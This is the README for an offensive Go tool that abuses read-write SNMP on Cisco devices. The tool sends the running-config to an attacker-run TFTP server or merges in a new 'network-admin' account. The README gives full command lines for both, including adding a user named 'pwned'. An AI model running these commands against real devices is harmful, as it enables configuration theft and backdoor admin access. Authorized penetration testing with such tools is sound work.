# cisco-snmp-pwner

If you ever got access to a RW snmp access to a cisco device this tool got you covered.

It spins up a local TFTP server (you need to run it as root as it's a low port) and either dumps the `running-config` or adds a new user to it by merging the `running-config` with a custom one provided via the TFTP server.

The listen IP you need to specify needs to be accessible from the cisco device so IPs like 0.0.0.0 will not work.

## dump

This will dump the config as `dump_target_randomstring` to the current directory. The filename is printed upon executing the tool

```
sudo ./cisco-snmp-server dump --listen 10.0.0.1 --target cisco.local --version 2c --communitystring private
```

### Options

```
OPTIONS:
   --debug, -d                     enable debug output (default: false)
   --listen value, -l value        local ip to listen on, must be accessible by the cisco device
   --target value, -t value        target ip of the cisco device
   --targetfile value, --tf value  list of ip addresses instead of target
   --timeout value                 timeout for SNMP operations (default: 2s)
   --version value                 snmp version to use. Either 1, 2c or 3 (default: "2c")
   --communitystring value         snmp communitystring with RW permissions
   --v3username value              snmp v3 username
   --v3authpass value              snmp v3 authpass
   --v3privacypass value           snmp v3 privacypass
   --v3authproto value             snmp v3 authproto
   --v3privproto value             snmp v3 privproto
   --help, -h                      show help (default: false)
```

## add-user

This will add a new user with the `network-admin` role (can be overidden) to the device. Be sure to dump the device first and make sure the user does not exist, otherwise you will overwrite it and may cause some networking issues.

```
sudo ./cisco-snmp-server add-user --listen 10.0.0.1 --target cisco.local --version 2c --communitystring private --username pwned --password 'allYourCisc0AreBelongToUs$'
```

### Options

```
OPTIONS:
   --debug, -d                     enable debug output (default: false)
   --listen value, -l value        local ip to listen on, must be accessible by the cisco device
   --target value, -t value        target ip of the cisco device
   --targetfile value, --tf value  list of ip addresses instead of target
   --timeout value                 timeout for SNMP operations (default: 2s)
   --version value                 snmp version to use. Either 1, 2c or 3 (default: "2c")
   --communitystring value         snmp communitystring with RW permissions
   --v3username value              snmp v3 username
   --v3authpass value              snmp v3 authpass
   --v3privacypass value           snmp v3 privacypass
   --v3authproto value             snmp v3 authproto. Either SHA, SHA224, SHA256, SHA384, SHA512, MD5 or NoAuth
   --v3privproto value             snmp v3 privproto. Either NoPriv, DES, AES, AES192, AES256, AES192C or AES256C
   --username value                username of the user to add
   --password value                password of the user to add
   --role value                    role of the new user (default: "network-admin")
   --help, -h                      show help (default: false)
```

## Build instructions

### Without source

- Install golang [https://go.dev/doc/install](https://go.dev/doc/install)
- `go install github.com/firefart/cisco-snmp-pwner@latest`

### From source

- Install golang [https://go.dev/doc/install](https://go.dev/doc/install)
- `go get`
- `make` or `go build -o cisco-snmp-pwner`
